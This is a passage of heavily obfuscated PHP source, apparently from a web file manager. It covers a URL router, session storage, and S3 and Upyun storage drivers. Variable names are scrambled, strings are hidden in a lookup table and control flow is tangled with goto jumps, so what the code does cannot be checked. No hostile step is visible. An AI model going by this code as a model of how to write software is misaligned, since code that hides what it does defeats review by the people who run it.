(substr($f¿á£¦Í÷, -4) == $FÂ„âÅÚ[1408]) { echo $FÂ„âÅÚ[1409] . $eš‰‚‘ÚÑ . $FÂ„âÅÚ[1410] . $FÂ„âÅÚ[14]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\171" => "\x5b\x5e\x2f\x5d\53", "\72\x6e\165\155" => "\x5b\60\x2d\x39\135\53", "\72\x61\x6c\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($Då‡£ŸÃñ°, $b¹áâ­»³Ğ) { $C§‡Ã‰Œë =& $_SERVER[±á õÁ]; if ($Då‡£ŸÃñ° == $C§‡Ã‰Œë[1411]) { $d¦êÇ‰°¬ù = array_map($C§‡Ã‰Œë[1412], $b¹áâ­»³Ğ[0]); $F§££Â¥½Ğ = strpos($b¹áâ­»³Ğ[1], $C§‡Ã‰Œë[8]) === 0 ? $b¹áâ­»³Ğ[1] : $C§‡Ã‰Œë[8] . $b¹áâ­»³Ğ[1]; $cË±‰£ÑÅ = $b¹áâ­»³Ğ[2]; } else { $d¦êÇ‰°¬ù = null; $F§££Â¥½Ğ = strpos($b¹áâ­»³Ğ[0], $C§‡Ã‰Œë[8]) === 0 ? $b¹áâ­»³Ğ[0] : $C§‡Ã‰Œë[8] . $b¹áâ­»³Ğ[0]; $cË±‰£ÑÅ = $b¹áâ­»³Ğ[1]; } array_push(self::$maps, $d¦êÇ‰°¬ù); array_push(self::$routes, $F§££Â¥½Ğ); array_push(self::$methods, strtoupper($Då‡£ŸÃñ°)); array_push(self::$callbacks, $cË±‰£ÑÅ); } public static function error($d‹ÆÚ‚·ò) { self::$errorCallback = $d‹ÆÚ‚·ò; } public static function haltOnMatch($a÷À½®÷™à = true) { self::$halts = $a÷À½®÷™à; } public static function dispatch() { goto dÌêõ¹ß»¸; e„¯Î¨ªÁÖ: self::$routes = preg_replace($C¥×ÂßòÇµ[1094], $C¥×ÂßòÇµ[8], self::$routes); if (in_array($CÚóìŒäªÊ, self::$routes)) { $fì¨÷ã¡Ş¼ = array_keys(self::$routes, $CÚóìŒäªÊ); foreach ($fì¨÷ã¡Ş¼ as $dœ³°ÈŠÔÑ) { if (self::$methods[$dœ³°ÈŠÔÑ] == $D¼›ø™ˆ £ || self::$methods[$dœ³°ÈŠÔÑ] == $C¥×ÂßòÇµ[1414] || in_array($D¼›ø™ˆ £, self::$maps[$dœ³°ÈŠÔÑ])) { $EĞƒ¨è„İ = !0; if (!is_object(self::$callbacks[$dœ³°ÈŠÔÑ])) { $bŸ¨ßøà = explode($C¥×ÂßòÇµ[8], self::$callbacks[$dœ³°ÈŠÔÑ]); $b¹‹‹ = end($bŸ¨ßøà); $aòº÷ÍµŸ“ = explode($C¥×ÂßòÇµ[1415], $b¹‹‹); $b©‰ß·†äÁ = new $aòº÷ÍµŸ“[0](); $b©‰ß·†äÁ->{$aòº÷ÍµŸ“[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$dœ³°ÈŠÔÑ]); if (self::$halts) { return; } } } } } else { $e÷ÈóÕêÛ– = 0; foreach (self::$routes as $dœ³°ÈŠÔÑ) { if (strpos($dœ³°ÈŠÔÑ, $C¥×ÂßòÇµ[4]) !== !1) { $dœ³°ÈŠÔÑ = str_replace($C“¬„É«„”, $eŒÅêÖíÉˆ, $dœ³°ÈŠÔÑ); } if (preg_match($C¥×ÂßòÇµ[1416] . $dœ³°ÈŠÔÑ . $C¥×ÂßòÇµ[1417], $CÚóìŒäªÊ, $fÀÛÈÜÄ)) { if (self::$methods[$e÷ÈóÕêÛ–] == $D¼›ø™ˆ £ || self::$methods[$e÷ÈóÕêÛ–] == $C¥×ÂßòÇµ[1414] || !empty(self::$maps[$e÷ÈóÕêÛ–]) && in_array($D¼›ø™ˆ £, self::$maps[$e÷ÈóÕêÛ–])) { $EĞƒ¨è„İ = !0; array_shift($fÀÛÈÜÄ); if (!is_object(self::$callbacks[$e÷ÈóÕêÛ–])) { $bŸ¨ßøà = explode($C¥×ÂßòÇµ[8], self::$callbacks[$e÷ÈóÕêÛ–]); $b¹‹‹ = end($bŸ¨ßøà); $aòº÷ÍµŸ“ = explode($C¥×ÂßòÇµ[1415], $b¹‹‹); $b©‰ß·†äÁ = new $aòº÷ÍµŸ“[0](); if (!method_exists($b©‰ß·†äÁ, $aòº÷ÍµŸ“[1])) { echo $C¥×ÂßòÇµ[1418]; } else { call_user_func_array(array($b©‰ß·†äÁ, $aòº÷ÍµŸ“[1]), $fÀÛÈÜÄ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$e÷ÈóÕêÛ–], $fÀÛÈÜÄ); if (self::$halts) { return; } } } } $e÷ÈóÕêÛ–++; } } if ($EĞƒ¨è„İ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $dÖßá…Ó¡Ä =& $_SERVER[±á õÁ]; header($_SERVER[$dÖßá…Ó¡Ä[1419]] . $dÖßá…Ó¡Ä[1420]); echo $dÖßá…Ó¡Ä[1421]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$C¥×ÂßòÇµ[1413]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto dã–Û™íİÉ; F¹ëÛÙ: $C“¬„É«„” = array_keys(static::$patterns); $eŒÅêÖíÉˆ = array_values(static::$patterns); $EĞƒ¨è„İ = !1; goto e„¯Î¨ªÁÖ; dÌêõ¹ß»¸: $C¥×ÂßòÇµ =& $_SERVER[±á õÁ]; $CÚóìŒäªÊ = parse_url($_SERVER[$C¥×ÂßòÇµ[1413]], PHP_URL_PATH); $D¼›ø™ˆ £ = $_SERVER[$C¥×ÂßòÇµ[164]]; goto F¹ëÛÙ; dã–Û™íİÉ: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto f®Æåå­ƒš; bË¹ÔßôªÅ: $DÙàŒêøù = $b‚×ğŠŸ¦Ò[$F¯¢ÇÖ“Ô]; $B¶–„Ã›İÊ = $b‚×ğŠŸ¦Ò[$A½ºËùŠ[779]]; switch ($F¯¢ÇÖ“Ô) { case $A½ºËùŠ[27]: self::$handle = Model($A½ºËùŠ[780]); break; case $A½ºËùŠ[781]: self::$handle = new CacheRedis($DÙàŒêøù, $B¶–„Ã›İÊ); break; case $A½ºËùŠ[782]: self::$handle = new CacheMemcached($DÙàŒêøù, $B¶–„Ã›İÊ); break; case $A½ºËùŠ[181]: $DÙàŒêøù[$A½ºËùŠ[85]] = $DÙàŒêøù[$A½ºËùŠ[85]] . $A½ºËùŠ[1425]; self::$handle = new CacheFile($DÙàŒêøù, $B¶–„Ã›İÊ); default: break; } goto f•’œä­ŠÜ; Cùî“³¹: $b‚×ğŠŸ¦Ò = $GLOBALS[$A½ºËùŠ[6]][$A½ºËùŠ[352]]; self::$sessionTime = $b‚×ğŠŸ¦Ò[$A½ºËùŠ[1422]]; $f‹¥¹ª•‰“ = isset($GLOBALS[$A½ºËùŠ[1423]]) ? $GLOBALS[$A½ºËùŠ[1423]] : SESSION_ID; goto DéÃ°Óš›; f•’œä­ŠÜ: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $E„Îé”œ‡Ó = new self(); return $E„Îé”œ‡Ó; goto dŒÕÌ…àÄõ; f®Æåå­ƒš: $A½ºËùŠ =& $_SERVER[±á õÁ]; static $E„Îé”œ‡Ó = false; if ($E„Îé”œ‡Ó) { return $E„Îé”œ‡Ó; } goto Cùî“³¹; DéÃ°Óš›: if (self::$sessionSign) { } else { if (Cookie::get($f‹¥¹ª•‰“)) { self::$sessionSign = Cookie::get($f‹¥¹ª•‰“); } else { self::$sessionSign = guid(); } } Cookie::setSafe($f‹¥¹ª•‰“, self::$sessionSign, self::$sessionTime); $F¯¢ÇÖ“Ô = $b‚×ğŠŸ¦Ò[$A½ºËùŠ[1424]]; goto bË¹ÔßôªÅ; dŒÕÌ…àÄõ: } public static function sign($EØ…ÃÚÏ“† = false) { $EØ…ÃÚÏ“† && (self::$sessionSign = $EØ…ÃÚÏ“†); self::init(); return self::$sessionSign; } public static function set($AŞÓ®øîÃÃ, $cË¡ğˆ¿ÉÑ = false) { self::init(); if (is_array($AŞÓ®øîÃÃ)) { foreach ($AŞÓ®øîÃÃ as $CÚ„™ÍŸ’® => $C¨ï‡‡ÑÙ’) { array_set_value(self::$data, $CÚ„™ÍŸ’®, $C¨ï‡‡ÑÙ’); } } else { array_set_value(self::$data, $AŞÓ®øîÃÃ, $cË¡ğˆ¿ÉÑ); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($cÀ¿Ÿ·—£ = false) { self::init(); if (!$cÀ¿Ÿ·—£) { return self::$data; } return array_get_value(self::$data, $cÀ¿Ÿ·—£); } public static function remove($DÈ‡Ê°ÊÍ£) { self::init(); unset(self::$data[$DÈ‡Ê°ÊÍ£]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[±á õÁ][784])) { self::$handle->clearTimeout(); } } } goto e“±äŸƒà; e´É³ğ¢¾: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($c¨ËÃƒÚ¹Û) { parent::__construct($c¨ËÃƒÚ¹Û); } public function uploadFormData($C‘°œß¯à„, $F“…äŸ‡í = 3600) { goto Eñä“èÒ½Ê; eò”ªò¬İ¨: $aÚì¾—ÀË„ = hash_hmac($eëÂô•ÃÑæ[1165], $Eİ×¬–ÃÂÔ, $B‘ğÖ‘‰·, !0); $B•ÁáôÖñÄ = hash_hmac($eëÂô•ÃÑæ[1165], $C‚ÚÅÇ“¬Ô, $aÚì¾—ÀË„, !0); $f—Ì§£‰„ = hash_hmac($eëÂô•ÃÑæ[1165], $DêØÛëÊŠª, $B•ÁáôÖñÄ); goto B¸µ“Ë‘ÂÎ; Eñä“èÒ½Ê: $eëÂô•ÃÑæ =& $_SERVER[±á õÁ]; $AØËœ˜ÄÔ› = $eëÂô•ÃÑæ[199]; $Bãİî­ÁšÜ = $eëÂô•ÃÑæ[1155]; goto CéŞ‹ŸÉÅÅ; AÍŸì‹ùÚ—: $C‚ÚÅÇ“¬Ô = $eëÂô•ÃÑæ[1157]; $CØÙ°áñ¸ç = $F“…äŸ‡í . $eëÂô•ÃÑæ[43]; $f½ÕÓ—Å = $eëÂô•ÃÑæ[1121]; goto cĞ£Éä´õ‰; B¸µ“Ë‘ÂÎ: $bîÍó‚•Ó» = array($eëÂô•ÃÑæ[217] => $eëÂô•ÃÑæ[43], $eëÂô•ÃÑæ[1167] => $eëÂô•ÃÑæ[43], $eëÂô•ÃÑæ[1125] => $AØËœ˜ÄÔ›, $eëÂô•ÃÑæ[1129] => $f½ÕÓ—Å, $eëÂô•ÃÑæ[1133] => $DêØÛëÊŠª, $eëÂô•ÃÑæ[1168] => $b¾Â¹à¨¼Œ, $eëÂô•ÃÑæ[1169] => $Bãİî­ÁšÜ, $eëÂô•ÃÑæ[1170] => $e¯³ğŒ», $eëÂô•ÃÑæ[1171] => $CØÙ°áñ¸ç, $eëÂô•ÃÑæ[1172] => $f—Ì§£‰„, $eëÂô•ÃÑæ[183] => $this->getHost()); return $bîÍó‚•Ó»; goto Bº©ìŸÇ¢ù; CéŞ‹ŸÉÅÅ: $Eİ×¬–ÃÂÔ = $eëÂô•ÃÑæ[69]; $e¯³ğŒ» = gmdate($eëÂô•ÃÑæ[1156]); $fÌ…îºß…ñ = gmdate($eëÂô•ÃÑæ[715]); goto AÍŸì‹ùÚ—; C¾œË—¸¤ö: $DêØÛëÊŠª = base64_encode(json_encode($Ašä†²ä†)); $a¨Ãç¤í  = hash_hmac($eëÂô•ÃÑæ[1165], $fÌ…îºß…ñ, $eëÂô•ÃÑæ[1166] . $this->secret, !0); $B‘ğÖ‘‰· = hash_hmac($eëÂô•ÃÑæ[1165], $this->region, $a¨Ãç¤í , !0); goto eò”ªò¬İ¨; cĞ£Éä´õ‰: $d„¶½‘Òí¼ = array($this->accessKey, $fÌ…îºß…ñ, $this->region, $Eİ×¬–ÃÂÔ, $C‚ÚÅÇ“¬Ô); $b¾Â¹à¨¼Œ = implode($eëÂô•ÃÑæ[8], $d„¶½‘Òí¼); $Ašä†²ä† = array($eëÂô•ÃÑæ[1123] => gmdate($eëÂô•ÃÑæ[1122], strtotime($eëÂô•ÃÑæ[1158])), $eëÂô•ÃÑæ[1124] => array(array($eëÂô•ÃÑæ[1126] => $this->bucket), array($eëÂô•ÃÑæ[1125] => $AØËœ˜ÄÔ›), array($eëÂô•ÃÑæ[1127], $eëÂô•ÃÑæ[1128], $eëÂô•ÃÑæ[43]), array($eëÂô•ÃÑæ[1127], $eëÂô•ÃÑæ[1159], $eëÂô•ÃÑæ[43]), array($eëÂô•ÃÑæ[1127], $eëÂô•ÃÑæ[1160], $eëÂô•ÃÑæ[43]), array($eëÂô•ÃÑæ[1129] => $f½ÕÓ—Å), array($eëÂô•ÃÑæ[1161] => $b¾Â¹à¨¼Œ), array($eëÂô•ÃÑæ[1162] => $Bãİî­ÁšÜ), array($eëÂô•ÃÑæ[1163] => $e¯³ğŒ»), array($eëÂô•ÃÑæ[1164] => $CØÙ°áñ¸ç))); goto C¾œË—¸¤ö; Bº©ìŸÇ¢ù: } public function multiUploadFormData($f â±ßåò, $dñ››ŸŠğ = 3600) { $dÔÉìì©ê =& $_SERVER[±á õÁ]; $DŸˆ’Û°´ô = gmdate($dÔÉìì©ê[1251]); $Dºõ¥ÊÚê = array(); $d­÷ˆÀ˜‹“ = $this->client->getUploadId($this->bucket, $f â±ßåò, $Dºõ¥ÊÚê); if (!$d­÷ˆÀ˜‹“) { return !1; } return array($dÔÉìì©ê[227] => $d­÷ˆÀ˜‹“, $dÔÉìì©ê[183] => $this->getHost() . $dÔÉìì©ê[8] . $this->pathEncode($f â±ßåò), $dÔÉìì©ê[228] => $DŸˆ’Û°´ô, $dÔÉìì©ê[99] => $f â±ßåò); } public function multiUploadAuthData($C¤…¤öÉ­, $A‰à­ªëù = array()) { goto DÊ¼ƒ½Ş”¹; e˜²ôæ¾¹: if (strpos($e½º††·¾, $c¢ì¬†Óæª[231]) === 0) { if (isset($BÚ½„Ê İ[$c¢ì¬†Óæª[1253]])) { $Eõ»¶©éÙ¦ = $BÚ½„Ê İ[$c¢ì¬†Óæª[1253]]; } else { if (isset($E†ô‹ÏØ“[$c¢ì¬†Óæª[1253]])) { $Eõ»¶©éÙ¦ = $E†ô‹ÏØ“[$c¢ì¬†Óæª[1253]]; } else { $Eõ»¶©éÙ¦ = hash($c¢ì¬†Óæª[1165], $c¢ì¬†Óæª[43]); } } return array($c¢ì¬†Óæª[237] => $E†ô‹ÏØ“[$c¢ì¬†Óæª[237]], $c¢ì¬†Óæª[1253] => $Eõ»¶©éÙ¦, $c¢ì¬†Óæª[228] => $E†ô‹ÏØ“[$c¢ì¬†Óæª[1256]]); } return $E†ô‹ÏØ“[$c¢ì¬†Óæª[237]]; goto c´œ‘Ó®°ˆ; B´„¼·ÙŞ: if (isset($A‰à­ªëù[$c¢ì¬†Óæª[1252]])) { $BÚ½„Ê İ[$c¢ì¬†Óæª[1253]] = $A‰à­ªëù[$c¢ì¬†Óæª[1252]]; } $AÊÆå£´ğ‡ = explode($c¢ì¬†Óæª[185], $this->getHost()); $bõ—‰¶éÂ = array($c¢ì¬†Óæª[1254] => $AÊÆå£´ğ‡[1], $c¢ì¬†Óæª[1255] => $c¢ì¬†Óæª[43], $c¢ì¬†Óæª[217] => $c¢ì¬†Óæª[126], $c¢ì¬†Óæª[1167] => $A‰à­ªëù[$c¢ì¬†Óæª[87]]); goto Aºº„ØÀ‡; aáÈí„½ùø: unset($A‰à­ªëù[$c¢ì¬†Óæª[99]]); if (isset($A‰à­ªëù[$c¢ì¬†Óæª[229]])) { return $this->listUploadParts($aòŠ¡À¬±˜, $A‰à­ªëù); } $BÚ½„Ê İ = array(); goto B´„¼·ÙŞ; DÊ¼ƒ½Ş”¹: $c¢ì¬†Óæª =& $_SERVER[±á õÁ]; $e½º††·¾ = isset($A‰à­ªëù[$c¢ì¬†Óæª[175]]) ? $A‰à­ªëù[$c¢ì¬†Óæª[175]] : $c¢ì¬†Óæª[43]; $aòŠ¡À¬±˜ = $A‰à­ªëù[$c¢ì¬†Óæª[99]]; goto aáÈí„½ùø; Aºº„ØÀ‡: $cÈ ‹·ã’¹ = $c¢ì¬†Óæª[232]; $d÷êœîà’» = $c¢ì¬†Óæª[8] . $this->pathEncode($aòŠ¡À¬±˜) . $e½º††·¾; $E†ô‹ÏØ“ = $this->client->__getSignatureV4($BÚ½„Ê İ, $bõ—‰¶éÂ, $cÈ ‹·ã’¹, $d÷êœîà’»); goto e˜²ôæ¾¹; c´œ‘Ó®°ˆ: } public function listUploadParts($càñ¡Æ°, $D±¦Û’Şƒ’ = array()) { goto F›÷‹²Ü‹; AÎì’³«: $dÚ¦Ã©‘Ş„ = $this->client->__getSignatureV4($A¿ÂÖòîÚ–, $DÛ£‰Ù¬±Ï, $BõÕê’–„Ë, $CêÅ¥ºÈ, $bãØô¡‹‡ó); return array($A¤†›‘²¬Ö[237] => $dÚ¦Ã©‘Ş„[$A¤†›‘²¬Ö[237]], $A¤†›‘²¬Ö[228] => $dÚ¦Ã©‘Ş„[$A¤†›‘²¬Ö[1256]], $A¤†›‘²¬Ö[239] => $E´¬²¨‡¸Â, $A¤†›‘²¬Ö[1253] => $dÚ¦Ã©‘Ş„[$A¤†›‘²¬Ö[1253]]); goto fïÛŠ½À¸“; cÜà…Î¾Êç: $bãØô¡‹‡ó .= $A¤†›‘²¬Ö[1260]; $A¿ÂÖòîÚ– = array(); $bİâÕ°Îáä = explode($A¤†›‘²¬Ö[185], $this->getHost()); goto EÙ”ËĞâÑ§; EÙ”ËĞâÑ§: $DÛ£‰Ù¬±Ï = array($A¤†›‘²¬Ö[1254] => $bİâÕ°Îáä[1], $A¤†›‘²¬Ö[217] => $A¤†›‘²¬Ö[126], $A¤†›‘²¬Ö[1167] => strlen($bãØô¡‹‡ó)); $BõÕê’–„Ë = $A¤†›‘²¬Ö[230]; $CêÅ¥ºÈ = $A¤†›‘²¬Ö[8] . $this->pathEncode($càñ¡Æ°) . $D±¦Û’Şƒ’[$A¤†›‘²¬Ö[175]]; goto AÎì’³«; F›÷‹²Ü‹: $A¤†›‘²¬Ö =& $_SERVER[±á õÁ]; $F‰éÏĞîÙÕ = str_replace($A¤†›‘²¬Ö[238], $A¤†›‘²¬Ö[43], $D±¦Û’Şƒ’[$A¤†›‘²¬Ö[175]]); $E´¬²¨‡¸Â = $this->client->listParts($this->bucket, $càñ¡Æ°, $F‰éÏĞîÙÕ); goto B¬ßàÊ¢†‚; B¬ßàÊ¢†‚: if (!$E´¬²¨‡¸Â) { return !1; } $bãØô¡‹‡ó = $A¤†›‘²¬Ö[1257]; foreach ($E´¬²¨‡¸Â as $c¤À“ã£ƒ³) { $bãØô¡‹‡ó .= $A¤†›‘²¬Ö[1258] . "\x3c\120\141\162\164\x4e\165\155\x62\x65\162\x3e{$c¤À“ã£ƒ³[$A¤†›‘²¬Ö[1212]]}\74\x2f\120\x61\x72\x74\x4e\165\x6d\142\145\162\76\xa" . "\74\105\124\141\147\76{$c¤À“ã£ƒ³[$A¤†›‘²¬Ö[1213]]}\74\57\x45\x54\141\147\x3e\12" . $A¤†›‘²¬Ö[1259]; } goto cÜà…Î¾Êç; fïÛŠ½À¸“: } public function link($d¢¯Æ‘Ê¡, $fá¤³º¤¥ = array()) { return parent::link($d¢¯Æ‘Ê¡, $fá¤³º¤¥); } public function fileOut($eÆ±­ñ­Êä, $a†”¯ë®‚Ğ = false, $b«½É§…¨ = false, $a±•Ş£¨ŠÀ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[±á õÁ][1261])) { return parent::fileOutServer($eÆ±­ñ­Êä, $a†”¯ë®‚Ğ, $b«½É§…¨, $a±•Ş£¨ŠÀ); } parent::fileOut($eÆ±­ñ­Êä, $a†”¯ë®‚Ğ, $b«½É§…¨, $a±•Ş£¨ŠÀ); } public function fileOutImage($bê³‹Œ, $CÜ±†Ó‚ÃŒ = 250) { if (strstr($this->endpoint, $_SERVER[±á õÁ][1261])) { return parent::fileOutImageServer($bê³‹Œ, $CÜ±†Ó‚ÃŒ); } parent::fileOutImage($bê³‹Œ, $CÜ±†Ó‚ÃŒ); } public function fileOutLink($eÇ–ç³á¦) { $fµ“ß†ª¾° =& $_SERVER[±á õÁ]; if (substr($eÇ–ç³á¦, 0, 7) == $fµ“ß†ª¾°[1136]) { $eÇ–ç³á¦ = $fµ“ß†ª¾°[1137] . substr($eÇ–ç³á¦, 7); } header($fµ“ß†ª¾°[166] . $eÇ–ç³á¦); die; } public function getHost() { $D‚±±™ùäÆ =& $_SERVER[±á õÁ]; $D¡ÑÉ†ØØß = str_rtrim(parent::getHost(), $D‚±±™ùäÆ[8] . $this->bucket); $D¡ÑÉ†ØØß = explode($D‚±±™ùäÆ[185], $D¡ÑÉ†ØØß); return $D¡ÑÉ†ØØß[0] . $D‚±±™ùäÆ[185] . $this->bucket . $D‚±±™ùäÆ[101] . $D¡ÑÉ†ØØß[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ešô‰²¨Æ¿, $E¦®Ãßõ = 0) { parent::__construct(); $this->source = $ešô‰²¨Æ¿; $this->sourceSize = $E¦®Ãßõ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($eİâ°ŠŠõÂ = false) { return $this->sourceSize; } public function getContent($a¥Ú¬¨´¸æ = false) { return $this->fileSubstr($a¥Ú¬¨´¸æ, 0, $this->sourceSize); } public function fileSubstr($fŞ‘Ä‰ŠÍ = false, $cïíÁÍì¾ø = 0, $fÔË«éƒÛ = 0) { if (!$fÔË«éƒÛ) { $fÔË«éƒÛ = $this->sourceSize; } $eºÖÆ÷Ö„Ş = $this->sourceSize - $cïíÁÍì¾ø; if ($fÔË«éƒÛ >= $eºÖÆ÷Ö„Ş) { $fÔË«éƒÛ = $eºÖÆ÷Ö„Ş; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $cïíÁÍì¾ø, $fÔË«éƒÛ); } if ($this->sourceType == self::TYPE_FILE) { if ($fÔË«éƒÛ <= 0) { return $_SERVER[±á õÁ][43]; } $CĞƒ‡ãÑª¡ = ftell($this->source); fseek_64($this->source, $CĞƒ‡ãÑª¡ + $cïíÁÍì¾ø); $bÈ›ÒÀ­Ø = @fread($this->source, $fÔË«éƒÛ); fseek_64($this->source, $CĞƒ‡ãÑª¡); return $bÈ›ÒÀ­Ø; } } public function hashMd5($eö­Òõó¤Š = false) { return md5($this->getContent()); } public static function hash($E†ãÃĞ¸Ÿ, $FÌ¼íìö°Ä = 0) { $d‘…Õ˜Æ = new PathDriverStream($E†ãÃĞ¸Ÿ, $FÌ¼íìö°Ä); return $d‘…Õ˜Æ->hashSimple($E†ãÃĞ¸Ÿ); } public static function md5($dê¬‡îæÁˆ, $dÙäõ¼é› = 0) { $f¶¥ä‰™ƒ¥ = new PathDriverStream($dê¬‡îæÁˆ, $dÙäõ¼é›); return $f¶¥ä‰™ƒ¥->hashMd5($dê¬‡îæÁˆ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\160\72\57\x2f\166\60\x2e\141\160\x69\56\165\x70\x79\x75\156\x2e\143\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($Dã×…¾±¬) { parent::__construct(); $this->_init($Dã×…¾±¬); } public function _init($B—Š‹—òĞ) { $dÍÓãà¢¡ñ =& $_SERVER[±á õÁ]; foreach ($B—Š‹—òĞ as $bóÙ Èí … => $B¢»£³è) { if (isset($this->{$bóÙ Èí …})) { $this->{$bóÙ Èí …} = $B¢»£³è; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($dÍÓãà¢¡ñ[1262] . LNG($dÍÓãà¢¡ñ[1193])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($B˜î‘È¬, $a—ĞÈ³“• = "\107\105\124") { $e¡ôÙ Â†“ =& $_SERVER[±á õÁ]; $CÑä™í“ö = gmdate($e¡ôÙ Â†“[1227]); $dø²¾¿ñ…‹ = base64_encode(hash_hmac($e¡ôÙ Â†“[1263], "{$a—ĞÈ³“•}\46{$B˜î‘È¬}\x26{$CÑä™í“ö}", md5("{$this->userpass}"), !0)); $BÆÇëÔßÖ = array("\101\x75\x74\150\x6f\162\151\172\x61\164\x69\157\156\72\125\x50\131\125\116\40{$this->username}\x3a{$dø²¾¿ñ…‹}", "\x44\x61\164\x65\72{$CÑä™í“ö}"); return $BÆÇëÔßÖ; } public function ussRequest($B†¨ìì¤ƒˆ, $D‚ÇÎø¿Ø = "\107\105\x54", $F¡ çò‡ìŠ = false, $C›Û†’èá = false, $eï¿Øµ‘Ã = false) { goto D§ãŠŠî½; A†¤¾ŠÂÙ: if (!$DŸƒ¬“¦¡) { return array($aß¥‡ãê³¡[1054] => !1, $aß¥‡ãê³¡[1056] => $aß¥‡ãê³¡[1264]); } if (strtolower($D‚ÇÎø¿Ø) == $aß¥‡ãê³¡[198] || in_array($DŸƒ¬“¦¡[$aß¥‡ãê³¡[1054]], array($aß¥‡ãê³¡[1121], $aß¥‡ãê³¡[1265]))) { $F¡ çò‡ìŠ = $DŸƒ¬“¦¡[$aß¥‡ãê³¡[1266]]; } else { $F¡ çò‡ìŠ = json_decode($DŸƒ¬“¦¡[$aß¥‡ãê³¡[1056]], !0); if (!$F¡ çò‡ìŠ) { $F¡ çò‡ìŠ = $DŸƒ¬“¦¡[$aß¥‡ãê³¡[1056]]; } else { if (!$DŸƒ¬“¦¡[$aß¥‡ãê³¡[714]] && isset($F¡ çò‡ìŠ[$aß¥‡ãê³¡[1267]])) { $F¡ çò‡ìŠ = $F¡ çò‡ìŠ[$aß¥‡ãê³¡[1267]]; } } } return array($aß¥‡ãê³¡[1054] => $DŸƒ¬“¦¡[$aß¥‡ãê³¡[714]], $aß¥‡ãê³¡[1056] => $F¡ çò‡ìŠ); goto föİÚ¦œ†Ò; D§ãŠŠî½: $aß¥‡ãê³¡ =& $_SERVER[±á õÁ]; $B†¨ìì¤ƒˆ = trim($B†¨ìì¤ƒˆ, $aß¥‡ãê³¡[8]); $f—»–õ™ãÕ = "\x2f{$this->bucket}\57{$B†¨ìì¤ƒˆ}"; goto eâîí¡ôƒÀ; eâîí¡ôƒÀ: $aË†ÏÃó—ò = $this->ussHeaders($f—»–õ™ãÕ, $D‚ÇÎø¿Ø); if ($C›Û†’èá) { $aË†ÏÃó—ò = array_merge($aË†ÏÃó—ò, $C›Û†’èá); } $DŸƒ¬“¦¡ = url_request($this->endpoint . $f—»–õ™ãÕ, $D‚ÇÎø¿Ø, $F¡ çò‡ìŠ, $aË†ÏÃó—ò, $eï¿Øµ‘Ã); goto A†¤¾ŠÂÙ; föİÚ¦œ†Ò: } public function mkfile($cİÂ§“œ­‡, $B³Â½”ˆµ¸ = '', $f¶µÎ±‘Ø = REPEAT_RENAME) { if ($this->setContent($cİÂ§“œ­‡, $B³Â½”ˆµ¸)) { return $this->getPathOuter($cİÂ§“œ­‡); } return !1; } public function mkdir($D”¶‰¹àÅñ, $FŠõÉÜ› = REPEAT_SKIP) { $f— ³ÓÒ¿µ =& $_SERVER[±á õÁ]; $eÁöˆìîï = trim($D”¶‰¹àÅñ, $f— ³ÓÒ¿µ[8]); if ($this->_isFolder($eÁöˆìîï)) { return $this->getPathOuter($eÁöˆìîï); } $CÂÉö‰“ä¸ = array($f— ³ÓÒ¿µ[1268]); $c­®…©Ä— = $this->ussRequest($eÁöˆìîï, $f— ³ÓÒ¿µ[230], !1, $CÂÉö‰“ä¸); return $c­®…©Ä—[$f— ³ÓÒ¿µ[1054]] ? $this->getPathOuter($eÁöˆìîï) : !1; } public function copyFile($d²­ÄÆ³ËÅ, $cøÉœåÂÌØ) { $F³ÃŒÏ¤Â =& $_SERVER[±á õÁ]; $Dªñğ£â¨± = array($F³ÃŒÏ¤Â[1269] . "\x2f{$this->bucket}\x2f{$d²­ÄÆ³ËÅ}", $F³ÃŒÏ¤Â[1270]); $c²å¿Æ¹†« = $this->ussRequest($cøÉœåÂÌØ, $F³ÃŒÏ¤Â[232], !1, $Dªñğ£â¨±); return $c²å¿Æ¹†«[$F³ÃŒÏ¤Â[1054]] ? !0 : $this->getPathOuter($cøÉœåÂÌØ); } public function moveFile($AóÔ³Ğ×…, $c‰ƒåöÉøó) { $e»Ö õ³¡É =& $_SERVER[±á õÁ]; $AÑÊ’æåÆ = array($e»Ö õ³¡É[1271] . "\x2f{$this->bucket}\57{$AóÔ³Ğ×…}", $e»Ö õ³¡É[1270]); $d¦Éí’‚“‡ = $this->ussRequest($c‰ƒåöÉøó, $e»Ö õ³¡É[232], !1, $AÑÊ’æåÆ); return $d¦Éí’‚“‡[$e»Ö õ³¡É[1054]] ? !0 : $this->getPathOuter($c‰ƒåöÉøó); } public function 